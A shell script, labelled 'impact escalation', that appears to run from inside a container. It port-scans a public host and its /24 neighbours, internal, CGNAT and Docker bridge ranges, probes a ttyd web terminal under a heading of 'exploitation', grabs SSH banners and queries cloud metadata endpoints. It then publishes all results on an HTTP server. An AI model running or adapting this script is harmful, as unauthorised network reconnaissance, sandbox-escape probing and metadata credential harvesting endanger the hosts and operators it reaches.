#!/bin/sh
echo "=== v10: impact escalation — full network scan ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== INTERFACES ===" >> /app/index.html
ip -4 addr show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ROUTES ===" >> /app/index.html
ip route show >> /app/index.html 2>&1
echo "" >> /app/index.html

# === HOST FULL PORT SCAN ===
echo "=== HOST PORT SCAN (45.89.190.124) ===" >> /app/index.html
for port in 21 22 25 53 80 111 139 443 445 873 2049 2375 2376 3306 4243 5432 5672 6379 6443 8000 8080 8443 9090 9100 9200 9443 10250 10255 15672 27017 5601 3000 4222 8222 1883 11211; do
  nc -z -w1 45.89.190.124 $port 2>/dev/null && echo "45.89.190.124:$port OPEN" >> /app/index.html
done
echo "" >> /app/index.html

# === ADJACENT VMs on same /24 ===
echo "=== ADJACENT VMs: 45.89.190.0/24 ===" >> /app/index.html
for i in $(seq 100 140); do
  [ "$i" = "124" ] && continue
  for port in 22 80 443 9100; do
    nc -z -w1 45.89.190.$i $port 2>/dev/null && echo "45.89.190.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

# === INTERNAL RANGES ===
echo "=== INTERNAL: 10.0.0.0/24 ===" >> /app/index.html
for i in 1 2 3 4 5 10 100 254; do
  for port in 22 80 443 8080 9100; do
    nc -z -w1 10.0.0.$i $port 2>/dev/null && echo "10.0.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== INTERNAL: 100.64.x.x (Carrier-grade NAT) ===" >> /app/index.html
for net in "100.64.18" "100.64.19" "100.64.20"; do
  for i in 1 2 100 107 200 254; do
    for port in 22 80 9100; do
      nc -z -w1 ${net}.$i $port 2>/dev/null && echo "${net}.$i:$port OPEN" >> /app/index.html
    done
  done
done
echo "" >> /app/index.html

# === TTYD EXPLOITATION ===
echo "=== TTYD (172.18.0.1:8080) ===" >> /app/index.html
echo "--- GET / ---" >> /app/index.html
curl -sv -m 3 "http://172.18.0.1:8080/" >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- GET /ws ---" >> /app/index.html
curl -sv -m 3 "http://172.18.0.1:8080/ws" >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "--- WS upgrade ---" >> /app/index.html
curl -sv -m 3 "http://172.18.0.1:8080/ws" \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGVzdA==" >> /app/index.html 2>&1
echo "" >> /app/index.html

# === SSH BANNER ===
echo "=== SSH BANNER ===" >> /app/index.html
echo "" | nc -w2 45.89.190.124 22 >> /app/index.html 2>&1
echo "" >> /app/index.html
echo "" | nc -w2 172.18.0.1 22 >> /app/index.html 2>&1
echo "" >> /app/index.html

# === BRIDGE SCAN ===
echo "=== BRIDGE: 172.18.0.x all ports ===" >> /app/index.html
for i in $(seq 1 20); do
  for port in 22 80 443 2375 5672 8000 8080 9100 9200 15672; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

# === METADATA ===
echo "=== METADATA ===" >> /app/index.html
curl -s -m 3 "http://169.254.169.254/" >> /app/index.html 2>&1
curl -s -m 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html
cd /app && python3 -m http.server 8080
